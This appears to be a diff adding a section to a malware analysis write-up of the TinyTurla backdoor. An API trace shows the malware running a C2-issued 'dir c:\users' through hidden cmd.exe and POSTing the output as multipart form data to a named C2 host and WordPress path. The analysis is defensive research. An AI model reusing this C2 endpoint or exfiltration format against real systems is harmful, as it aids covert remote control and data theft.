@@ -141,5 +141,105 @@ With the following 'gettask' message, the malware is offering the C2 an opportun
 ```
 ---  
 
+First command :  
 
+I've chosen to make the malware execute the following command : 'rsp: dir c:\users'   
+Which triggered the following behavior :  
+
+Note thet thread executing the command **[tid 0x968]** is not the one sending the result back to the C2 **[tid 0x664]**  
+
+```html
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <CreateProcessA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR               lpApplicationName    : 0x0 (null)
+[PAR] LPCTSTR               lpCommandLine        : 0x00007FFF146E0888
+[STR]                       -> "C:\Windows\System32\cmd.exe"
+[PAR] LPSECURITY_ATTRIBUTES lpProcessAttributes  : 0x0
+[PAR] LPSECURITY_ATTRIBUTES lpThreadAttributes   : 0x0
+[PAR] BOOL                  bInheritHandles      : 0x1
+[PAR] DWORD                 dwCreationFlags      : 0x8000000 (CREATE_NO_WINDOW)
+[PAR] LPVOID                lpEnvironment        : 0x0
+[PAR] LPCSTR                lpCurrentDirectory   : 0x0 (null)
+[PAR] LPSTARTUPINFOA        lpStartupInfo        : 0x000000F4405DF820
+[PAR] LPPROCESS_INFORMATION lpProcessInformation : 0x000000F4405DF800
+[RET] 0x7fff146b46b0 in [tinyturla.dll]
+
+[...]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpConnect> in [WINHTTP.dll] 
+[PAR] HINTERNET     hSession       : 0x3e803410
+[PAR] LPCWSTR       pswzServerName : 0x000000F43F8A52A0
+[STR]               -> "hanagram.jp"
+[PAR] INTERNET_PORT nServerPort    : 443
+[RET] 0x7fff146bbb16 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hConnect          : 0x3f66ac30
+[PAR] LPCWSTR   pwszVerb          : 0x000000F44055F748
+[STR]           -> "POST"
+[PAR] LPCWSTR   pwszObjectName    : 0x000000F43F3BC580
+[STR]           -> "/wp/wp-content/themes/hanagram/rss-old.php"
+[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
+[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
+[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
+[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
+[RET] 0x7fff146bbc26 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpSendRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest         : 0x000000F43F66A450
+[PAR] LPCWSTR   pwszHeaders      : 0x000000F43F3BD1C0
+[STR]           -> "Content-Type: multipart/form-data; boundary="-""
+[PAR] DWORD     dwHeadersLength  : 0xffffffff
+[PAR] LPVOID    lpOptional       : 0x0 (null)
+[PAR] DWORD     dwOptionalLength : 0x0
+[PAR] DWORD     dwTotalLength    : 0x2fc
+[RET] 0x7fff146bd38b in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpWriteData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest                 : 0x000000F43F66A450
+[PAR] LPCVOID   lpBuffer                 : 0x000000F43F892EB0
+[STR]           -> "---"
+[STR]              "Content-Disposition: form-data;name="id""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              "ea2ced84"
+[STR]              "---"
+[STR]              "Content-Disposition: form-data;name="result""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              ""
+[STR]              "Microsoft Windows [version 6.3.9600]"
+[STR]              "(c) 2013 Microsoft Corporation. Tous droits r‚serv‚s."
+[STR]              ""
+[STR]              "C:\Windows\system32>chcp 437 > NUL"
+[STR]              ""
+[STR]              "C:\Windows\system32>dir c:\users"
+[STR]              " Le volume dans le lecteur C n'a pas de nom."
+[STR]              " Le num‚ro de s‚rie du volume est 689B-5BB9"
+[STR]              ""
+[STR]              " R‚pertoire de c:\users"
+[STR]              ""
+[STR]              "21/10/2024  23:42    <DIR>          ."
+[STR]              "21/10/2024  23:42    <DIR>          .."
+[STR]              "22/08/2013  16:36    <DIR>          Public"
+[STR]              "27/02/2025  04:09    <DIR>          user"
+[STR]              "               0 fichier(s)                0 octets"
+[STR]              "               4 R‚p(s)  47ÿ927ÿ406ÿ592 octets libres"
+[STR]              ""
+[STR]              "C:\Windows\system32>exit"
+[STR]              ""
+[STR]              "-----"
+[PAR] DWORD     dwNumberOfBytesToWrite   : 0x2fc
+[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000F44055F7A0
+[RET] 0x7fff146bd3f2 in [tinyturla.dll]
+
+```
+
+As you can see, the malware is forcing the code page 437 (US) to be used even though my system is in french, hence the few misprints.  
+
+---  
 
